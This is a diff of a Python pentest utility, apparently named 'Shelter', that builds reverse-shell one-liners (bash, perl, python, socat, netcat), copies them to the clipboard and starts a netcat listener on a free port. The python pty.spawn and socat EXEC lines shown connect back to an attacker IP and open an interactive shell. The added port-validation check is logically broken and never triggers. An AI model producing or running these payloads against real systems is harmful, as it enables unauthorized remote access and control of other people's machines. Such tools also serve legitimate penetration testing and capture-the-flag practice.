@@ -7,15 +7,17 @@ import os
 import base64
 import netifaces
 import subprocess
+import re
 
-bold = "\033[1m"                                                                    
-green = "\033[32m"                  
+# Defining xterm-256color for usage in the script. Compatible for linux only.
+bold = "\033[1m"
+green = "\033[32m"
 purple = "\033[95m"
 red = "\033[91m"
-end = "\033[0m"                                                                                                                                                          
-                                                                                    
-                                          
-                                                                                    
+blue = "\033[34m"
+orange = "\033[33m"
+end = "\033[0m"
+
 def ap(text) :
     print(f"{bold}{green}[+] {end}{text}")
     #print(bold,green,"[+]",end,text)
@@ -26,14 +28,16 @@ def aerr(text) :
     print(f"{bold}{red}[-] {end}{text}") 
     #print(bold,red,"[-]",end,text)
 
-parser = argparse.ArgumentParser(description="""
+parser = argparse.ArgumentParser(description=f"""
+{bold}{green}
    _____ __         ____           
   / ___// /_  ___  / / /____  _____
   \__ \/ __ \/ _ \/ / __/ _ \/ ___/
  ___/ / / / /  __/ / /_/  __/ /    
 /____/_/ /_/\___/_/\__/\___/_/     
-                                                                      
-Version: v1.0.2 - 06/04/21 - Bides Das @Xyan1d3 """,formatter_class=RawTextHelpFormatter)
+
+{end}{bold}{red}To boldly catch shells even the size of a meteorite.      
+{end}{bold}{orange}Version: v1.0.4 - 07/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -70,6 +74,32 @@ py.add_argument("--nohandler",action="store_true",help="Copies only the revshell
 py2export.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
 pyexport.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
 socat.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+bash.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+bashi.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+bash196.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+bashrl.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+bash5.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+bashudp.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+nc_mkfifo.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+perl.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+py2.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+py.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+py2export.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+pyexport.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+socat.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
+bash.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+bashi.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+bash196.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+bashrl.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+bash5.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+bashudp.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+nc_mkfifo.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+perl.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+py2.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+py.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+py2export.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+pyexport.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
+socat.add_argument("-p",help="PORT for reverse shell.",metavar="8888")
 
 args = parser.parse_args()
 
@@ -94,10 +124,10 @@ def fetch_ip(): # This function IP of the NIC [default:tun0]
     return ip
 
 def fetch_port(): # This function returns a free tcp port for catching reverse shell.
-    revshell_ports = [8888,9001,9002,9003,9004,9005,9999,7777,6666,5555,4444]
-    for each in revshell_ports:
-        op = subprocess.run(['netstat', '-tl'], stdout=subprocess.PIPE).stdout.decode('utf-8')
-        if str(each) in op:
+    revshell_ports = [8888,9001,9002,9003,9004,9005,9999,7777,6666,5555,4444] # The ports to use as reverse shell.
+    for each in revshell_ports: # This loop will output an empty port which is not being actively used by our attackbox.
+        op = subprocess.run(['netstat', '-tul'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+        if str(each) in op: # Checks the presence of the port number in the netstat -tul output
             pass
         else:
             return each
@@ -120,25 +150,48 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
     "pyexport" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
     "socat" : f"socat TCP:{ATTACKER_IP}:{ATTACKER_PORT} EXEC:'bash',pty,stderr,setsid,sigint,sane"
     }
-    if language == "":
+    if language == "": # If the language parameter of this function is detected it will fallback to base64'ed bash.
         return payloads["bash"]
-    return payloads[language]
-def shell_handler(port,proto):
-    if proto == "tcp":
-        os.system(f"nc -lvnp {fetch_port()}")
-    elif proto == "udp":
-        os.system(f"nc -luvnp {fetch_port()}")
+    return payloads[language] # Returns reverseshell payload from the dictionary by slapping in ATTACKERIP and ATTACKERPORT.
+def shell_handler(port,proto): # shell_handler invokes a netcat listener it takes port to listen on and protocol UDP/TCP
+    if proto.lower() == "tcp":
+        os.system(f"nc -lvnp {fetch_port()}") # Invoking netcat as TCP listener
+    elif proto.lower() == "udp":
+        os.system(f"nc -luvnp {fetch_port()}") # Invoking netcat with UDP support
+
+
+
 if args.module == "rev": # Checks for 1st pos arg if its rev.
     if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
-        pyperclip.copy(shell_cpy(args.sub,fetch_ip(),fetch_port())) # It will take 2nd positional arg as language and copy the revshell in the clipboard.
-        if not args.nohandler:
+        #if args.i == None and args.p == None:
+        #    args.nohandler == True
+        if args.i != None: # Checks if IP is supplied via arg and check if it is a valid IP using regex.
+            check = bool(re.match("^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",args.i))
+            if not check: # Exits the script of the IP is not valid.
+                aerr(f"Fatal Error : {args.i} is not a valid ipv4 address")
+                exit()
+        if args.p != None: # Checks if port is supplied via arg and checks if it is in the valid port range.
+            if int(args.p) >= 65535 and int(args.p) < 0:
+                aerr(f"Fatal Error : {args.p} is not a valid port number.")
+        if args.i == None: # Using predefined variable to store the ip if not found by args.
+            args.i = fetch_ip()
+        if args.p == None: # Using predefined variable to store the port if not found by args.
+            args.p = fetch_port()
+        payload = shell_cpy(args.sub,args.i,args.p) # It will take 2nd positional args as language and store it in a variable.
+        pyperclip.copy(payload) # Will copy the revshell payload into the clipboard.
+        
+        if not args.nohandler: # It checks if the --nohandler flag not is supplied.
             ap("Starting up Shell Handler...")
-            if "udp".lower() in shell_cpy(args.sub,fetch_ip(),fetch_port()).lower(): # Checks if udp is present in the revshell then starts netcat with udp support
-                shell_handler(fetch_port(),"udp") # Invokes netcat listener with UDP support.
+            if "udp".lower() in payload.lower(): # Checks if udp is present in the revshell then starts netcat with udp support
+                shell_handler(args.p,"udp") # Invokes netcat listener with UDP support.
             else:
-                shell_handler(fetch_port(),"tcp") # Invokes netcat listener on tcp mode.
-        else:
+                shell_handler(args.p,"tcp") # Invokes netcat listener on tcp mode.
+        else: # It will take place when --nohandler flag is supplied.
             ainfo("No Handler flag detected. Handler will not be started.")
-    else:
-        pyperclip.copy(shell_cpy("bash",fetch_ip(),fetch_port())) # If 2nd positional arg is not supplied it will fallback to bash base64 encoded revshell.
-        shell_handler(fetch_port(),"tcp") # Invokes netcat listener on tcp mode.
+    else: # If not argument is added after rev then it automatically falls back to bash base64'ed bash revshell.
+        ainfo("No Payload specified : Falling back to base64 encoded bash -i revshell")
+        ap("Starting up Shell Handler...")
+        payload = shell_cpy("bash",fetch_ip(),fetch_port())
+        pyperclip.copy(payload)
+        shell_handler(fetch_port(),"tcp")
+
